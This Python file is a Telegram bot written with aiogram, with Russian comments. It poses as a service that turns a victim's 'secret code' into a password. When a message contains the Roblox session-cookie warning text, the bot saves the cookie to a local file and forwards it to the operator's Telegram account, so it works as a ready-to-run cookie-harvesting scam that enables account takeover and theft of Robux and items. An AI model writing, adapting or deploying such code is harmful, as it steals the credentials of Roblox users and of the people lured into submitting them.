from aiogram import Bot, Dispatcher, executor, types

Bot_token = '' #токен вашего бота в телеграм
ID = ''#твой айди в тг

bot = Bot(Bot_token)
dp = Dispatcher(bot)

async def on_startup(_):
    print('Бот запущен\n-----------')


#----------------------всякие-функции----------------------
text = '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_'

log_text = '🔔 Лог от '

def write_cookie(message):
    file = open("Cookie.txt", "a")
    file.write(f'{message}\n')
    file.close()

#----------------------всякие-функции----------------------


@dp.message_handler(commands=['start'])
async def start_handler(message: types.message):
    await message.answer(f'👋 Привет, {message.from_user.first_name}!\n  Отправь секретный код жертвы и получи пароль')

@dp.message_handler()
async def if_0(message: types.message):
    if text in message.text:
        await message.answer(text='✅ Ваш код находится в очереди, ожидайте обработки')
        write_cookie(message.text)#эту строчку можно удалить если не хотите сохранять куки в файл
        print(f'{message.from_user.first_name} отправил куки')

        try:
            await bot.send_message(chat_id=ID, text=f'🔔 Лог от <a href="https://t.me/{message.from_user.username}">{message.from_user.full_name}</a>\n\n<code>{message.text}</code>', parse_mode='HTML', disable_web_page_preview=True)
        except:
            pass
    else:
        await message.answer(text='❌ Скопируй код полностью!')

if __name__ == '__main__':
    executor.start_polling(dp, skip_updates=False, on_startup=on_startup)
